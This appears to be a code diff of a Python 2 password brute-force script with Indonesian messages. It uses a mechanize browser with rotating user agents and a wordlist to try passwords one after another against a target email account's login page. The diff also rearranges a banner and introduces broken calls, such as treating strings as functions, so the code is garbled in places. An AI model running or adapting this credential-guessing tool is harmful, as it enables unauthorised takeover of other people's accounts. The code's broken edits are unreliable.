@@ -31,37 +31,8 @@ def runntxt(s):
 		sys.stdout.flush()
 		time.sleep(10. / 2100)
 
-def lop():
-         print  GG+"""
-
-                  `.-://////:-.`
-              .:+o+:-..````..-:+o+:.
-           `:o+-`                `:+o:`
-         `/o:`                      `:o/`
-        -s/`  .-..`            `..--` `/s-
-       /o.   `:.`.-:----------:-.``:-   .o/
-      /o`    .:`    `              --    `o/
-     -s.     .:`                   --     .s-
-     o/     .:`                     --     +o
-    .s-     :.                      `:`    -s`
-    .s.     :.                      `:`    .s.
-    .s-     --                      .:     -s.
-     o/     `-.                    `-.     /o
-     -s.     `--`                `.-`     .s-
-      /o` ----``..--..`    `...--.`      `o/
-       /o. `----`  `-.      `-.         .o/
-        -o:  -.......        ..       `:o-
-         `:o:``....--        ..     `:o:`
-           `:+/-`  `-        ..  `-/+:`
-              `-/+///..````..://+/-`
-                  `.-::////::-.` \033[91;1m
-
-                \033[90;1mLife Of Programmer\033[91;1m
-             Powered by:\033[97m Iqbalz Noobs
-      """
 
 def banner():
-    lop()
     os.system('clear')
     print " "
     runntxt(GL+"              Assalamu'@laikum. ^_^")
@@ -124,11 +95,27 @@ def edit_wordlist():
                 print RR+"Pilih yg bener cuk..."
                 edit_wordlist()
 
+
+def main():
+	global noobs
+	noobs = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	noobs.set_handle_robots(False)
+	noobs.set_handle_redirect(True)
+	noobs.set_cookiejar(cj)
+	noobs.set_handle_equiv(True)
+	noobs.set_handle_referer(True)
+	noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+
+	runn_noobs()
+	pass_noobs()
+        edit_wordlist()
+
 def iqbalz_brute(password_cuk):
    
      try:
 
-	print (GG+"[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+password_cuk)
+	sys.stdout.write(GG+"[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+password_cuk)
 	sys.stdout.flush()
 	noobs.addheaders = [('User-agent', random.choice(useragen_cuk))]
 	site = noobs.open(login)
@@ -153,31 +140,45 @@ def iqbalz_brute(password_cuk):
         edit_wordlist()  
         sys.exit()
 
-def main():
-	global noobs
-	noobs = mechanize.Browser()
-	cj = cookielib.LWPCookieJar()
-	noobs.set_handle_robots(False)
-	noobs.set_handle_redirect(True)
-	noobs.set_cookiejar(cj)
-	noobs.set_handle_equiv(True)
-	noobs.set_handle_referer(True)
-	noobs.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-
-	runn_noobs()
-	pass_noobs()
-        edit_wordlist()
 def pass_noobs():
 	global password_cuk
 	password_lol = open(password_list, 'r')
 	for password_cuk in password_lol:
-		password_lol = password_cuk
+		password_lol = password_cuk("\n","")
 		iqbalz_brute(password_cuk)
 
 
 def runn_noobs():
          global password_list
-        
+         
+         lop = GG+"""
+
+                  `.-://////:-.`
+              .:+o+:-..````..-:+o+:.
+           `:o+-`                `:+o:`
+         `/o:`                      `:o/`
+        -s/`  .-..`            `..--` `/s-
+       /o.   `:.`.-:----------:-.``:-   .o/
+      /o`    .:`    `              --    `o/
+     -s.     .:`                   --     .s-
+     o/     .:`                     --     +o
+    .s-     :.                      `:`    -s`
+    .s.     :.                      `:`    .s.
+    .s-     --                      .:     -s.
+     o/     `-.                    `-.     /o
+     -s.     `--`                `.-`     .s-
+      /o` ----``..--..`    `...--.`      `o/
+       /o. `----`  `-.      `-.         .o/
+        -o:  -.......        ..       `:o-
+         `:o:``....--        ..     `:o:`
+           `:+/-`  `-        ..  `-/+:`
+              `-/+///..````..://+/-`
+                  `.-::////::-.` \033[91;1m
+
+                \033[90;1mLife Of Programmer\033[91;1m
+             Powered by:\033[97m Iqbalz Noobs
+      """
+
                                                   
          lop()
          nuub = open(password_list, 'r')
